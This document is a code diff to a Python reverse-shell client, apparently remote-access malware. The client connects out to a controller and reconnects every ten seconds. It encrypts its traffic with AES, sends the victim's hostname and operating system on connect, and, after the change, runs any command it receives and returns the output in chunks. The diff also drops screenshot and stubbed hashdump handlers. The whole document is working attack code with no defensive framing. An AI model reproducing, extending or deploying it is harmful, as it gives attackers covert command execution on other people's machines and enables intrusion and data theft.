@@ -6,6 +6,7 @@ from aes_crypt import AESCipher
 from time import sleep
 from base64 import b64encode, b64decode
 from PIL import ImageGrab
+import platform
 import datetime
 
 
@@ -20,10 +21,20 @@ class ReverseShellClient:
             try:
                 self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.conn.connect((self.host, self.port))
+                self.send_client_info()
                 self.listen_for_commands()
             except Exception as e:
                 print(f"Connection error: {e}")
                 sleep(10)
+
+    def send_client_info(self):
+        try:
+            hostname = socket.gethostname()
+            os_type = platform.system()
+            client_info = f"{hostname}|{os_type}"
+            self.conn.send(AESCipher.encrypt(client_info).encode("utf-8"))
+        except Exception as e:
+            print(f"Failed to send client info: {e}")
 
     def listen_for_commands(self):
         try:
@@ -79,27 +90,14 @@ class ReverseShellClient:
             self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
 
     def execute_command(self, command):
-        if command.startswith("ipconfig"):
-            if os.name == "nt":
-                result = self.run_system_command("ipconfig")
-            else:
-                result = self.run_system_command("ifconfig")
-                if "command not found" in result:
-                    result = self.run_system_command("ip a")
-        elif command.startswith("screenshot"):
-            result = self.take_screenshot()
-        elif command.startswith("hostname"):
-            result = socket.gethostname()
-        elif command.startswith("search"):
-            result = "Search functionality not implemented."
-        elif command.startswith("hashdump"):
-            result = "Hashdump functionality not implemented."
-        else:
+        try:
             result = self.run_system_command(command)
+        except Exception as e:
+            result = str(e)
         self.send_large_data(result)
 
     def send_large_data(self, data):
-        chunks = [data[i : i + 4096] for i in range(0, len(data), 4096)]
+        chunks = [data[i : i + 1024] for i in range(0, len(data), 1024)]
         for chunk in chunks:
             self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
         self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
